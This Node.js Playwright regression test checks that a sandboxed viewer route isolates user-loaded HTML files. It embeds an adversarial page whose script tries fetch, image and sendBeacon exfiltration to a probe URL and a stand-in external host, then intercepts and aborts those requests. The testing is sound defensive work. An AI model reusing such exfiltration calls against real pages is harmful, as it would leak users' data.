/** Chromium regression of the installed /original File API route.
 * Exercises a real browser, real installed viewer and an adversarial local
 * HTML document. No scientific records, private corpus, or remote source.
 */
import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import fs from 'node:fs/promises';
import path from 'node:path';
import {createRequire} from 'node:module';
const require = createRequire(import.meta.url);
let playwright;
try {playwright = require('playwright');}
catch {playwright = require(require.resolve('playwright', {
  paths: [process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES].filter(Boolean)
}));}

const args = new Map();
for(let i=2;i<process.argv.length;i+=2)args.set(process.argv[i],process.argv[i+1]);
const url = args.get('--url');
const reportPath = args.get('--report');
if(!url || !reportPath)throw new Error('--url and --report are mandatory');
const origin = new URL(url).origin;
assert.ok(['localhost','127.0.0.1'].includes(new URL(url).hostname));
const evidence = {status:'FAIL',scenario:'installed-original-file-api-browser',
  checks:[],sensitive_http_requests:[],errors:[]};
const check = x=>evidence.checks.push(x);
let browser, failure;
try {
  browser = await playwright.chromium.launch({headless:true});
  const context = await browser.newContext({viewport:{width:1440,height:900}});
  // Never actually transmit a probe if a regression allows a request:
  // intercept and abort it, then FAIL based on this observation.
  await context.route('**/*', async route=>{
    const address = route.request().url();
    if(address.includes('atlas-original-exfil') ||
       (/^https?:/.test(address) && new URL(address).origin!==origin)){
      evidence.sensitive_http_requests.push(address);
      await route.abort();
    } else await route.continue();
  });
  const page=await context.newPage();
  page.on('pageerror',err=>evidence.errors.push(err.message));
  const response=await page.goto(origin+'/original',{waitUntil:'networkidle'});
  assert.equal(response.status(),200);
  assert.ok((response.headers()['content-security-policy']||'').includes("connect-src 'none'"));
  const sandbox=await page.locator('#original-frame').getAttribute('sandbox');
  assert.equal(sandbox,'allow-scripts allow-downloads');
  check('original_route_with_opaque_sandbox');

  const attackUrl=origin+'/api/catalog?atlas-original-exfil=probe-only';
  const externalUrl='https://example.invalid/?atlas-original-exfil=probe-only';
  const legitimateScript = [
    "document.body.dataset.originalLoaded='yes';",
    "document.getElementById('legacy-toggle').onclick=()=>{document.getElementById('legacy-status').textContent='NAVIGATED'};",
    "try{fetch("+JSON.stringify(attackUrl)+").catch(()=>{});}catch(e){}",
    "try{const im=new Image();im.src="+JSON.stringify(attackUrl)+";document.body.append(im);}catch(e){}",
    "try{const im=new Image();im.src="+JSON.stringify(externalUrl)+";document.body.append(im);}catch(e){}",
    "try{navigator.sendBeacon("+JSON.stringify(attackUrl)+",'probe-only');}catch(e){}"
  ].join('');
  const scriptSha=createHash('sha256').update(legitimateScript).digest('base64');
  const localHTML='<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">'+
    '<meta http-equiv="Content-Security-Policy" content="default-src * data: blob: '+
    "'unsafe-inline'; script-src 'sha256-"+scriptSha+"'; connect-src *; img-src * data: blob:;"+
    ' style-src '+"'unsafe-inline'"+';">'+
    '<title>Atlas original - teste de isolamento sem ciência</title></head><body>'+
    '<section class="tab-panel" id="tree"><button id="legacy-toggle">Abrir seção</button>'+
    '<span id="legacy-status">INICIAL</span></section>'+
    '<script id="data" type="application/json">{"records":[]}</script>'+
    '<script>'+legitimateScript+'</script></body></html>';
  await page.locator('#original-file').setInputFiles({
    name:'index.html',mimeType:'text/html',buffer:Buffer.from(localHTML)
  });
  await page.locator('#original-wrapper').waitFor({state:'visible'});
  const inner=page.frameLocator('#original-frame');
  await inner.locator('body[data-original-loaded="yes"]').waitFor();
  await inner.locator('#legacy-toggle').click();
  assert.equal(await inner.locator('#legacy-status').innerText(),'NAVIGATED');
  check('selected_original_inline_bundle_runs_and_navigates');
  await page.waitForTimeout(500);
  assert.deepEqual(evidence.sensitive_http_requests,[]);
  check('inline_bundle_cannot_exfiltrate_by_fetch_image_beacon_or_external_url');
  await page.locator('#original-file').setInputFiles({
    name:'ATLAS-ATUAL.html',mimeType:'text/html',buffer:Buffer.from(
      "<!doctype html><html><head><meta http-equiv='refresh' content='0;url=builds/id/index.html'></head></html>")
  });
  assert.equal(await page.locator('#original-wrapper').isHidden(),true);
  assert.match(await page.locator('#original-status').innerText(),/ponteiro ATLAS-ATUAL/);
  check('pointer_is_rejected_instead_of_following_untrusted_location');
  assert.equal(await page.request.get(origin+'/api/legacy-source').then(r=>r.status()),404);
  assert.deepEqual(evidence.errors,[]);
  check('no_server_source_api_and_no_browser_page_errors');
  evidence.status='PASS_SCOPED';
} catch(e) {
  failure=e;
  evidence.error=e.message;
} finally {
  if(browser)await browser.close();
  await fs.mkdir(path.dirname(reportPath),{recursive:true});
  await fs.writeFile(reportPath,JSON.stringify(evidence,null,2)+'\n');
  console.log(JSON.stringify(evidence,null,2));
}
if(failure)process.exitCode=1;
